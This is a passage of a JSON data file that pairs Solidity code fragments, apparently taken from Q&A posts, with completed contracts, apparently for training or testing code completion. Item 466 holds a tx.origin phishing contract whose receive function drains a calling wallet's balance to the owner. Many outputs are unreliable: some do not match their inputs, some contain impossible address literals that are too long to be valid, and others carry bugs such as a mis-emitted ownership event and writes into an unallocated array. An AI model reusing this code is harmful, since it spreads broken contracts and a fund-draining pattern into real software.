address spender) public view returns (uint256) {\n        return allowances[owner][spender];\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        return balances[account];\n    }\n\n}\n\n"
    },
    "459.sol": {
        "input": "const source = fs.readFileSync(inboxPath, 'utf8');\n\nconsole.log(solc.compile(source, 1));\n\n<Buffer 54 65 73 74 69 6e 67 20 4e 6f 64 65 2e 6a 73 20 72 65 61 64 46 69 6c 65 28 29>\n\nconsole.log(solc.compile(source, 1));\n\nconst source = fs.readFileSync(inboxPath, 'utf8');\n\nconst inboxPath = path.resolve(__dirname, 'contracts', 'Inbox.sol');\nconst source = fs.readFileSync(inboxPath, 'utf8');\n\nconsole.log(solc.compile(source, 1));\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Inbox {\n\n    address private inbox;\n\n    address public contractAddress;\n\n    constructor(address _inbox) public{\n        inbox = _inbox;\n        contractAddress = msg.sender;\n    }\n\n    function() public payable {\n    }\n}\n\n"
    },
    "460.sol": {
        "input": "address[] memory parentsOfChild; \nparentsOfChild[0] = rootAddress; \n\naddress[] memory parentsOfChild = new address[](1); \nparentsOfChild[0] = rootAddress;\n\nagents[agents.length - 1] = address(agent);\n\nagents.push(address(agent));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Family {\n    address public rootAddress;\n    address[] public parentsOfChild;\n    address[] public agents;\n\n    constructor(address _rootAddress) public {\n        rootAddress = _rootAddress;\n        parentsOfChild = new address[](1);\n        parentsOfChild[0] = rootAddress;\n    }\n\n    function addParent(address _parentAddress) public {\n        parentsOfChild.push(_parentAddress);\n    }\n\n    function addAgent(address _agent) public {\n        agents.push(_agent);\n    }\n\n    function setLastAgent(address _agent) public {\n        require(agents.length > 0, \"No agents to replace\");\n        agents[agents.length - 1] = _agent;\n    }\n}\n\n"
    },
    "462.sol": {
        "input": "addr.transfer(amount)\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract SimpleTransfer {\n    function send(address recipient, uint256 amount) public {\n        recipient.transfer(amount);\n    }\n}\n\n"
    },
    "463.sol": {
        "input": "my_instance=MyClass() # in python\ncont myInstance=new MyClass() \n\ncontract StorageFactory is SimpleStorage{}\n\nSimpleStorage[] public simpleStorageArray;\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface SimpleStorage {\n  function getData(uint16 id) external returns(string);\n  function putData( uint16 id, string data) external returns(string);\n  function getName() external returns (string);\n  function version() external returns (string);\n}\n\n"
    },
    "466.sol": {
        "input": "require(tx.origin == msg.sender)\n\n  TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);\n\n require(tx.origin == owner); \n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface TxUserWallet {\n    function transferTo(address recipient, uint amount) external;\n}\n\ncontract TxUserPay {\n    constructor(address userWalletAddr) {\n        owner = msg.sender;\n    }\n\n    address owner;\n\n    receive() external payable {\n        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);\n\n        require(tx.origin == owner);\n    }\n\n    event Transfer(address indexed user, uint amount, uint gas);\n}\n\n"
    },
    "467.sol": {
        "input": "contract EtherUnits {\n    uint public oneWei = 1 wei;\n    bool public isOneWei = 1 wei == 1;\n\n    uint public oneEther = 1 ether;\n    bool public isOneEther = 1 ether == 1e18;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract EtherUnits {\n    uint public oneWei = 1 wei;\n    // 1 wei is equal to 1\n    bool public isOneWei = 1 wei == 1;\n\n    uint public oneEther = 1 ether;\n    // 1 ether is equal to 10^18 wei\n    bool public isOneEther = 1 ether == 1e18;\n}\n\n"
    },
    "469.sol": {
        "input": "contract FreezableToken is StandardToken {\n    using SafeMath for uint;\n\n    function getFreezing() public {\n        for (uint i = 0; i < _index.add(1); i = i.add(1)) {\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface StandardToken {\n    function getFreezing() external view returns (uint amount);\n}\n\n"
    },
    "470.sol": {
        "input": "pragma solidity 0.8.10;\n\nimport \"https:\n\ncontract Test {\n    IERC20 public test ;\n\n    function clearTest() public {\n        delete test;\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function decimals () external view returns (uint8);\n\n    function totalSupply () external view returns (uint);\n\n    function balanceOf (address account) external view returns (uint);\n    function transfer (address recipient, uint256 amount) external returns (bool);\n    function allowance (address owner, address spender) external view returns (uint);\n}\n\ncontract Test {\n    IERC20 public  test ;\n\n    function clearTest () public {\n        delete test;\n    }\n\n}\n\n"
    },
    "471.sol": {
        "input": "function setIsPublicMintEnabled(bool isPublicMintEnabled_) external onlyOwner {\n    isPublicMintEnabled = isPublicMintEnabled_;\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract EtheriumMint {\n\n   \n  bool public isPublicMintEnabled = false;\n\n  function setIsPublicMintEnabled(bool isPublicMintEnabled_) external onlyOwner {\n    isPublicMintEnabled = isPublicMintEnabled_;\n  }\n\n  modifier onlyOwner() {\n    require(msg.sender == address(0x60839411756371021472764702672698431903879), \"Ownable: Caller is not the owner\");\n    _;\n  }\n\n  constructor() public {\n    isPublicMintEnabled = true;\n  }\n\n}\n\n"
    },
    "472.sol": {
        "input": "    receive() external payable {} \n    fallback() external payable {}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract PayableToken {\n    receive() external payable {}\n    fallback() external payable {}\n}\n\n"
    },
    "473.sol": {
        "input": "function getResult() public onlyOwner {\n    luckyPerson.transfer(address(this).balance);\n    lotteryId++;\n    delete lotChances;\n}\n\npragma solidity 0.8.7;\n    \ncontract Lottery {\n    address owner;\n    \n    constructor() {\n        owner = msg.sender;\n    }\n    \n    struct LotChance {\n        address payable userAddress;\n        uint256 ids;\n    }\n    \n    modifier onlyOwner() {\n        require(msg.sender == owner, \"You aren't smart contract owner!\");\n        _;\n    }\n    \n    LotChance[] public lotChances;\n    \n    function getResult(address _luckyPerson) public onlyOwner {\n        uint lotteryId = 0;\n        payable(_luckyPerson).transfer(address(this).balance);\n        lotteryId++;\n        delete lotChances;\n    }\n    \n    function partecipateToLottery(uint _id) public {\n        lotChances.push(LotChance(payable(msg.sender), _id));\n    }\n    \n    function getLengthArray() external view returns(uint) {\n        return lotChances.length;\n    } \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Lottery {\n    address owner;\n    \n    constructor() {\n        owner = msg.sender;\n    }\n    \n    struct LotChance {\n        address payable userAddress;\n        uint256 ids;\n    }\n    \n    modifier onlyOwner() {\n        require(msg.sender == owner, \"You aren't smart contract owner!\");\n        _;\n    }\n    \n    LotChance[] public lotChances;\n    \n    function getResult(address payable _luckyPerson) public onlyOwner {\n        uint lotteryId = 0;\n        _luckyPerson.transfer(address(this).balance);\n        lotteryId++;\n        delete lotChances;\n    }\n    \n    function partecipateToLottery(uint _id) public {\n        lotChances.push(LotChance(payable(msg.sender), _id));\n    }\n    \n    function getLengthArray() external view returns(uint) {\n        return lotChances.length;\n    }\n}\n\n"
    },
    "474.sol": {
        "input": "function checkIfUserHasNFTCard() public view returns (bool)\nfunction getUserHasNFTCard() public view returns (NFTCardAttributes)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC721 {\n    \n}\n\ninterface IERC20 {\n    \n}\n\n"
    },
    "475.sol": {
        "input": " (bool success, ) = addressToTransfer.call{value: address(this).balance}(\"\");\n require(success, \"Transfer failed.\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Transfer {\n    address public owner;\n    address public addressToTransfer;\n    uint256 public amount;\n\n    constructor(address _owner) public {\n        owner = _owner;\n    }\n\n    function transfer(address _addressToTransfer) public payable {\n        require(msg.sender == owner, \"Only owner can call this function.\");\n        addressToTransfer = _addressToTransfer;\n        amount = address(this).balance;\n        (bool success, ) = addressToTransfer.call{value: address(this).balance}(\"\");\n        require(success, \"Transfer failed.\");\n    }\n}\n\n"
    },
    "476.sol": {
        "input": "    function getAllData() public view returns (People[] memory) {\n        uint256 count = countArr.length;\n        People[] memory outputL = new People[](count);\n\n        while(count > 0) {\n            count--;\n            (string memory nam, uint256 num) = getPerson(countArr[count]);\n            People memory temp = People(nam, num);\n            outputL[count] = temp;\n        }\n\n        return outputL;\n    } \n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary Person {\n    struct Person {\n        string name;\n        uint256 number;\n    }\n}\n\ninterface IData {\n    function getPerson(uint256 id) external view returns (string memory, uint256);\n}\n\n"
    },
    "477.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract Caller {\n    event IsContract();\n    event NotContract();\n\n    constructor(Target target) {\n        if (target.isCallerContract()) {\n            emit IsContract();\n        } else {\n            emit NotContract();\n        }\n    }\n}\n\ncontract Target {\n    function isCallerContract() external view returns (bool) {\n        return msg.sender.code.length != 0;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract Caller {\n    event IsContract();\n    event NotContract();\n\n    constructor(Target target) {\n        if (target.isCallerContract()) {\n            emit IsContract();\n        } else {\n            emit NotContract();\n        }\n    }\n}\n\ncontract Target {\n    function isCallerContract() external view returns (bool) {\n        return msg.sender.code.length != 0;\n    }\n}\n\n"
    },
    "478.sol": {
        "input": "pragma solidity ^0.8.7;\ncontract transfertot{\n    address  public address2=0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db;  \n        address payable public owner;\n        constructor()payable {\n            owner=payable(msg.sender);\n        }\n        \n    uint public msgvalue=msg.value;\n         uint  balance1;\n         uint  balance2;\n         uint[]  balance1arr;\n         uint[]  balance2arr;\n\n\n        function transfer1(address payable  _address,uint _priceGwei)payable public  {\n        require(_priceGwei<=(msgvalue/10**9),\"balance is less than msgvalue\");\n            _address.transfer(_priceGwei*10**9);\n            balance1=owner.balance/(10**9);\n            balance2=address2.balance/(10**9);\n            balance1arr.push(balance1);\n            balance2arr.push(balance2);\n            msgvalue-=_priceGwei*10**9;\n        }\n    function ownerbalancearr()public view returns(uint[] memory){\n        return balance1arr;\n    }\n     function recieverbalancearr()public view returns(uint[] memory){\n        return balance2arr;\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\ncontract transfertot{\n    //address  public address1=0x5B38Da6a701c568545dCfcB03FcB875f56beddC4; it is owner address sample\n    address  public address2=0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db;  // it is reciever address sample\n        address payable public owner;\n        constructor()payable {\n            owner=payable(msg.sender);\n        }\n        \n    uint public msgvalue=msg.value;//contract value \n         uint  balance1;//owner balance\n         uint  balance2;//reciever balance\n         uint[]  balance1arr;\n         uint[]  balance2arr;\n\n\n        function transfer1(address payable  _address,uint _priceGwei)payable public  {\n        require(_priceGwei<=(msgvalue/10**9),\"balance is less than msgvalue\");//working in gwei\n            _address.transfer(_priceGwei*10**9);\n            balance1=owner.balance/(10**9);\n            balance2=address2.balance/(10**9);\n            balance1arr.push(balance1);\n            balance2arr.push(balance2);\n            msgvalue-=_priceGwei*10**9;\n        }\n    function ownerbalancearr()public view returns(uint[] memory){\n        return balance1arr;\n    }\n     function recieverbalancearr()public view returns(uint[] memory){\n        return balance2arr;\n    }\n}\n//when you want to deploy add some gwei to value in deploy and run transactions panel`\n//the contract value is differ from owner value\n//you can  check the`enter code here` output in this code\n//good day to you`\n\n"
    },
    "479.sol": {
        "input": "import \"https:\n\nbancor.deposit(Token(address(dai)), _amount);\n\n\n",
        "output": "pragma solidity ^0.4.25;\nlibrary BancorDeposit {\n  function deposit(uint _amountInWei) external returns (uint, uint);\n}\n\n"
    },
    "480.sol": {
        "input": "consumerID: payable(address(0))\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function balanceOf(address who) external view returns (uint);\n}\n\n"
    },
    "481.sol": {
        "input": "ERC20 token = ERC20('address to your desired ERC20 Token');\n\n\n",
        "output": "pragma solidity ^0.8.9;\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address payable) {\n        return payable(msg.sender);\n    }\n\n    function _msgData() internal view virtual returns (bytes memory) {\n        this;\n    }\n}\n\nabstract contract Ownable {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () {\n        _owner = msg.sender;\n        emit OwnershipTransferred(address(0), _owner);\n    }\n\n    modifier onlyOwner() {\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function transferOwnership(address newOwner) public onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        _owner = newOwner;\n        emit OwnershipTransferred(address(_owner), newOwner);\n    }\n}\n\n"
    },
    "482.sol": {
        "input": "function saveWalletData(uint _qty , string calldata _name) public{\n    wallet[_name] = _qty;\n}\n\nfunction consultarWallet(string calldata _name) public view returns(uint){\n    return wallet[_name];\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Wallet {\n    mapping(string => uint256) public wallet;\n\n    function saveWalletData(uint _qty , string calldata _name) public{\n        wallet[_name] = _qty;\n    }\n\n    function consultarWallet(string calldata _name) public view returns(uint){\n        return wallet[_name];\n    }\n}\n\n"
    },
    "483.sol": {
        "input": "import \"contractYouWantToInteractWith.sol\";\n\ncontract Interact {\n    contractYouWantToInteractWith public contract = contractYouWantToInteractWith(addressOfTheContract);\n\n\n    function interact() public {\n        contract.FUNCTIONFROMTHECONTRACT(inputs);\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Interact {\n}\n\n"
    },
    "484.sol": {
        "input": "import \"../interfaces/IERC20.sol\";\n\nfunction stakeTokens(uint256 _amount,address _token) public{\n    IERC20(_token).transferFrom(msg.sender,address(this),_amount);\n }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n"
    },
    "485.sol": {
        "input": "function mint() public payable {\n    require(msg.value == 1e18);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Puis {\n    function mint() public payable {\n        require(msg.value == 1e18);\n    }\n}\n\n"
    },
    "487.sol": {
        "input": "function addStaker() public payable {\n    require(msg.value == 1 ether);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Puisne_stakers_v1 {\n\n    function addStaker() public payable {\n        require(msg.value == 1 ether);\n    }\n}\n\n"
    },
    "488.sol": {
        "input": "require('condition', 'error msg');\n\nrequire(voting_status == VOTE_STATUS.CLOSED,\"Voting hasn't opened yet\");\n\nrequire(voting_status == VOTE_STATUS.OPEN,\"Voting hasn't opened yet\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract VotingContract {\n    enum VOTE_STATUS { OPEN, CLOSED }\n\n    VOTE_STATUS public voting_status;\n\n    constructor() public {\n        voting_status = VOTE_STATUS.CLOSED;\n    }\n\n    modifier onlyWhenOpen() {\n        require(voting_status == VOTE_STATUS.OPEN, \"Voting hasn't opened yet\");\n        _;\n    }\n\n    modifier onlyWhenClosed() {\n        require(voting_status == VOTE_STATUS.CLOSED, \"Voting hasn't opened yet\");\n        _;\n    }\n\n    function openVoting() public onlyWhenClosed {\n        voting_status = VOTE_STATUS.OPEN;\n    }\n\n    function closeVoting() public onlyWhenOpen {\n        voting_status = VOTE_STATUS.CLOSED;\n    }\n\n    function vote(uint _voteIndex) public onlyWhenOpen {\n        // Add your voting logic here\n    }\n}\n\n"
    },
    "489.sol": {
        "input": "constructor(){\n  owner = msg.sender;\n}\n\nrequire(owner == address(msg.sender);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TestContract1 {\n \n\n \n \n}\n\ncontract TestContract2 {\n   \n  address owner;\n\n    constructor() {\n      owner = msg.sender;\n    }\n\n    function ownerOf() public view returns (bool) {\n      return owner == msg.sender;\n    }\n\n    modifier onlyOwner() {\n      require(owner == address(msg.sender));\n      _;\n    }\n  }\n\n"
    },
    "491.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint256[] array = [100, 200, 300, 400, 500];\n\n    function remove(uint256 index) external {\n        require(array.length > index, \"Out of bounds\");\n        for (uint256 i = index; i < array.length - 1; i++) {\n            array[i] = array[i+1];\n        }\n        array.pop(); \n    }\n\n    function getArray() external view returns (uint256[] memory) {\n        return array;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint256[] array = [100, 200, 300, 400, 500];\n\n    function remove(uint256 index) external {\n        require(array.length > index, \"Out of bounds\");\n        // move all elements to the left, starting from the `index + 1`\n        for (uint256 i = index; i < array.length - 1; i++) {\n            array[i] = array[i+1];\n        }\n        array.pop(); // delete the last item\n    }\n\n    function getArray() external view returns (uint256[] memory) {\n        return array;\n    }\n}\n\n"
    },
    "492.sol": {
        "input": "function checkInventory() public view returns (uint256[] memory) {\n        require(owns[msg.sender].length != 0, \"Inventory is empty\");\n        uint256[] memory inventory = new uint256[](owns[msg.sender].length); \n        for (uint256 i = 0; i < owns[msg.sender].length; i++) {\n            inventory[i] = owns[msg.sender][i];\n        }\n        return (inventory);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface Ownable {\n    function owner() external view returns (address);\n\n    \n    function renounce() external;\n}\n\n"
    },
    "493.sol": {
        "input": "  function getRecordByAddressMap(address _patientAddress) public view returns (Records[] memory){\n    Records[] memory rec = new Records[](recordID);\n      for (uint i = 1; i <= rec.length; i++) {\n        if (_patientAddress == records[i][_patientAddress].patient == true) {\n          rec[i] = records[i][_patientAddress];\n          } else {\n            continue;\n          }\n      }\n    return rec;\n  }\n\n  function getRecordByAddressStruct(address _patientAddress) public returns(Records[] memory) {\n    Records[] storage _getstructs = getstructs;\n    for (uint i = 1; i < _getstructs.length; i++) {\n      if (_patientAddress == recordsarray[i].patient == true) {\n        Records memory newRecord = Records({\n          patient: recordsarray[i].patient,\n          hospital: recordsarray[i].hospital,\n          admissionDate: recordsarray[i].admissionDate,\n          dischargeDate: recordsarray[i].dischargeDate,\n          visitReason: recordsarray[i].visitReason\n        });\n        _getstructs.push(newRecord);\n        } else {\n          continue;\n        }\n    }\n    return _getstructs;\n  }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract RecordsManager {\n  \n  struct Records\n   {\n    address patientAddress;\n    bool status;\n    address hospital;\n    uint admissionDate;\n    uint dischargeDate;\n    uint visitReason;\n  }\n   \n  Records[] internal records;  \n  Records[] internal record;\n  Records[] internal newrecord;  \n  \n  \n  address[] internal recordids;\n  int internal recordID;\n  bool internal _pause = true;\n  uint public recordCount;\n  \n  \n  \n  mapping(address => Records[]) internal recordById;\n}\n\n"
    },
    "494.sol": {
        "input": "function subscribe(uint planId) external payable {\n    require(msg.value == 1 ether, \"You need to send 1 ETH\");\n}\n\nawait window.ethereum.request(\n    method: 'eth_sendTransaction',\n    [\n        from: userAddress,\n        to: yourContract,\n        data: <invoking the subscribe() function>,\n        value: <1 ETH in wei, in hex>\n    ]\n);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract YourContract {\n    \n    address payable public userAddress;\n\n    function subscribe(uint planId) \n        external payable \n        returns (bool) {\n\n        require(msg.value == 1 ether, \"You need to send 1 ETH\");\n        require(msg.sender == userAddress, \"\");\n\n        emit SubscriptionSuccess(userAddress, planId);\n\n    }\n\n    event SubscriptionSuccess(\n        address payable indexed userAddress,\n        uint256 planId\n    );\n}\n\n"
    },
    "495.sol": {
        "input": "import \"@chainlink/contracts/src/v0.7/Operator.sol\";\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Operator {\n\n    function getPrice() public view virtual returns (uint256) {\n        return 1 ether;\n    }\n}\n\n"
    },
    "496.sol": {
        "input": "function buy() external payable {\n    uint256 amount = calculateAmount(msg.value);\n\n    transfer(msg.sender, amount);\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface Token {\n    function transfer(address to, uint256 amount) external;\n}\n\ncontract BuyNow {\n    function buy() external payable {\n        uint256 amount = calculateAmount(msg.value);\n\n        transfer(msg.sender, amount);\n    }\n\n    function calculateAmount(uint256 value) private view returns (uint256 amount) {\n\n        uint256 tokenPrice = 30 * uint256(1e18);\n\n        amount = value / tokenPrice;\n    }\n\n    function transfer(address to, uint256 amount) private {\n        Token token = Token(0x18333658775046735161636409195328659640357928);\n        token.transfer(to, amount);\n    }\n}\n\n"
    },
    "497.sol": {
        "input": "\npragma solidity ^0.8.0;\n\ncontract example{\n\nstruct Input{\n    uint256 gettid;\n    string title1;\n    string title2;\n    string title3;\n    string title4;\n    string title5;\n}\nInput[] public inputsArray;\n\nfunction gettid() public view returns(uint256) {\nreturn inputsArray.length;\n}\n\nfunction addinput(\n    string memory _title1,\n    string memory _title2,\n    string memory _title3,\n    string memory _title4,\n    string memory _title5\n    \n) public {\n    uint256 _nextId = gettid();\n    inputsArray.push(Thread(_nextId, _title1, _title2, _title3, _title4, _title5));\n}}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract example {\n    struct Input {\n        uint256 gettid;\n        string title1;\n        string title2;\n        string title3;\n        string title4;\n        string title5;\n    }\n    \n    Input[] public inputsArray;\n    \n    function gettid() public view returns(uint256) {\n        return inputsArray.length;\n    }\n    \n    function addinput(\n        string memory _title1,\n        string memory _title2,\n        string memory _title3,\n        string memory _title4,\n        string memory _title5\n    ) public {\n        uint256 _nextId = gettid();\n        inputsArray.push(Input(_nextId, _title1, _title2, _title3, _title4, _title5));\n    }\n}\n\n"
    },
    "499.sol": {
        "input": "pragma solidity ^0.4.26;\n\ncontract PrimeNumber{\n    function isPrimeNumber(uint num1) public view returns(bool) {\n        bool result = true;\n        assembly{\n            for {let i := 2} lt(i, num1) {i := add(i, 1)}{\n                if eq(mod(num1, i), 0) {\n                    result := 0\n                }\n            }\n        }\n        return result;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract PrimeNumber {\n    function isPrimeNumber(uint num1) public view returns (bool) {\n        bool result = true;\n        assembly {\n        for {let i := 2} lt(i, num1) {i := add(i, 1)}{\n            if eq(mod(num1, i), 0) {\n                result := 0\n            }\n        }\n        }\n        return result;\n    }\n}\n\n"
    },
    "500.sol": {
        "input": " Listing[] storage userItems = userListings[msg.sender]\n\nfor(uint256 i=0; i<userItems.length; i++){\n\n   if userItems[i].listingId==listingId{\n      userItems[i].status=ListingStatus.Cancelled,\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ERC1155 {\n    function cancelListing(uint256 listingId) external;\n}\n\n"
    },
    "501.sol": {
        "input": "contract A {\n    function X() external virtual returns (uint256) {\n        return 1;\n    }\n}\n\ncontract B is A {\n    uint256 public constant override X = 2;\n}\n\ncontract A {\n    uint256 public immutable X;\n\n    constructor(uint256 _x) {\n        X = _x;\n    }\n}\n\ncontract B is A(2) {}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface I {\n\n    function X() external view returns (uint256 X);\n}\n\n"
    },
    "502.sol": {
        "input": "ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);\n\nnew ProxyRegistry(<constructor_params>);\n\nif (address(proxyRegistry.proxies(owner)) == operator) {\n    return true;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ProxyRegistrar {\n    function registerProxy(bytes4 interfaceId) external;\n\n    function unregisterProxy(bytes4 interfaceId) external;\n\n    function proxies(address owner) external view returns (address[] memory);\n}\n\n"
    },
    "503.sol": {
        "input": "require(arrayOne.length == arrayTwo.length)\nfor (i; arrayOne.length > i; i++) {\n    arrayOne[i] = ....;\n    arrayTwo[i] = ....;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint[] public arrayOne;\n    uint[] public arrayTwo;\n\n    constructor(uint[] memory _arrayOne, uint[] memory _arrayTwo) {\n        require(_arrayOne.length == _arrayTwo.length, \"Arrays must have the same length\");\n        arrayOne = _arrayOne;\n        arrayTwo = _arrayTwo;\n    }\n\n    function setArrays(uint[] memory _newArrayOne, uint[] memory _newArrayTwo) external {\n        require(_newArrayOne.length == _newArrayTwo.length, \"Arrays must have the same length\");\n        arrayOne = _newArrayOne;\n        arrayTwo = _newArrayTwo;\n    }\n}\n"
    },
    "504.sol": {
        "input": "mapping (address => mapping (address => uint256)) public userCollectionToken;\n\nfunction store(address _user, address _collection, uint256 _tokenId) external {\n    userCollectionToken[_user][_collection] = _tokenId;\n}\n\nstruct NFT {\n    address collection;\n    uint256 tokenID;\n}\n\nmapping (address => NFT) public userNFT;\n\nfunction store(address _user, address _collection, uint256 _tokenId) external {\n    userNFT[_user] = NFT(_collection, _tokenId);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract NFTStorage {\n    mapping (address => mapping (address => uint256)) public userCollectionToken;\n\n    function storeUserCollectionToken(address _user, address _collection, uint256 _tokenId) external {\n        userCollectionToken[_user][_collection] = _tokenId;\n    }\n\n    struct NFT {\n        address collection;\n        uint256 tokenID;\n    }\n\n    mapping (address => NFT) public userNFT;\n\n    function storeUserNFT(address _user, address _collection, uint256 _tokenId) external {\n        userNFT[_user] = NFT(_collection, _tokenId);\n    }\n}\n\n"
    },
    "505.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    address payable[] public bidders;\n    mapping (address => bool) isBidder; \n\n    function placeBid() public {\n        if (isBidder[msg.sender] == false) {\n            bidders.push(payable(msg.sender));\n            isBidder[msg.sender] = true;\n        }\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    address payable[] public bidders;\n    mapping (address => bool) isBidder; // default `false`\n\n    // only add `msg.sender` to `bidders` if it's not there yet\n    function placeBid() public {\n        // check against the mapping\n        if (isBidder[msg.sender] == false) {\n            // push the unique item to the array\n            bidders.push(payable(msg.sender));\n            // don't forget to set the mapping value as well\n            isBidder[msg.sender] = true;\n        }\n    }\n}\n\n"
    },
    "506.sol": {
        "input": "require(condition, error message);\n\nrequire(attrExists, \"no such attrib\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary AddressUtil {\n    function require(bool condition, string memory errorMessage) internal pure {\n        require(condition, errorMessage);\n    }\n\n    function require(bool condition, string memory errorMessage, bytes memory reason) internal pure {\n        require(condition, errorMessage);\n    }\n\n    function requireAttr(bytes32 attr, bool attrExists, string memory errorMessage) internal pure {\n        require(attrExists, errorMessage);\n    }\n}\n\n"
    },
    "507.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract Sender {\n    Receiver receiver;\n\n    constructor(address payable _receiver) {\n        receiver = Receiver(_receiver);\n    }\n\n    function sendWithData() external payable {\n        bytes memory sendData = abi.encode(\"hello\");\n        (bool success,) = address(receiver).call{value: msg.value}(sendData);\n        require(success);\n    }\n}\n\ncontract Receiver {\n    event Received(bytes, uint256);\n\n    fallback(bytes calldata receivedData) external payable returns (bytes memory) {\n        emit Received(receivedData, msg.value);\n        return \"\";\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract Sender {\n    Receiver receiver;\n\n    constructor(address payable _receiver) {\n        receiver = Receiver(_receiver);\n    }\n\n    function sendWithData() external payable {\n        bytes memory sendData = abi.encode(\"hello\");\n        (bool success,) = address(receiver).call{value: msg.value}(sendData);\n        require(success);\n    }\n}\n\ncontract Receiver {\n    event Received(bytes, uint256);\n\n    fallback(bytes calldata receivedData) external payable returns (bytes memory) {\n        emit Received(receivedData, msg.value);\n        return \"\";\n    }\n}\n\n"
    },
    "508.sol": {
        "input": "function slice(\n  uint256 start,\n  uint256 end,\n  uint256[] memory proposals\n) public pure returns (uint256[] memory) {\n  uint256[] memory result;\n\n  uint256 idx = 0;\n\n  for (uint256 i = start; i < end; i++) {\n      result[idx] = proposals[i];\n      idx++;\n  }\n\n  return result;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ProposalSliceer {\n  function slice(\n    uint256 start,\n    uint256 end,\n    uint256[] memory proposals\n  ) public pure returns (uint256[] memory) {\n    uint256[] memory result;\n\n    uint256 idx = 0;\n\n    for (uint256 i = start; i < end; i++) {\n        result[idx] = proposals[i];\n        idx++;\n    }\n\n    return result;\n  }\n}\n\n"
    },
    "509.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract test{\n    mapping(address=> mapping(uint => uint)) public address_id_liked;\n\n    function register(uint id) external{ \n        address_id_liked[msg.sender][id] = 1;\n    }\n\n    function test_(uint index) external view returns(uint) {\n        uint out = address_id_liked[msg.sender][index];\n        return(out);\n    }\n\n    function ops(uint id, uint num) external {\n        address_id_liked[msg.sender][id] = num;\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: GPL-3.0\npragma solidity ^0.8.0;\n\ncontract test{\n    mapping(address=> mapping(uint => uint)) public address_id_liked;\n\n    function register(uint id) external{ \n        address_id_liked[msg.sender][id] = 1;\n    }\n\n    function test_(uint index) external view returns(uint) {\n        uint out = address_id_liked[msg.sender][index];\n        return(out);\n    }\n\n    function ops(uint id, uint num) external {\n        address_id_liked[msg.sender][id] = num;\n    }\n}\n\n"
    },
    "510.sol": {
        "input": "pragma solidity ^0.8.2;\nimport \"./IAnotherContract.sol\";\n\ninterface IERC20 {\n    function balanceOf(address) external view returns (uint256);\n}\n\ncontract AnotherContract is IAnotherContract {\n    function doSomethingIfBalanceIsEnough()\n      external\n      returns (string memory)\n    {\n        uint256 userBalance = IERC20(myTokenAddress).balanceOf(msg.sender);\n        if (userBalance > 0) {\n        }\n    }\n}\n\n\n",
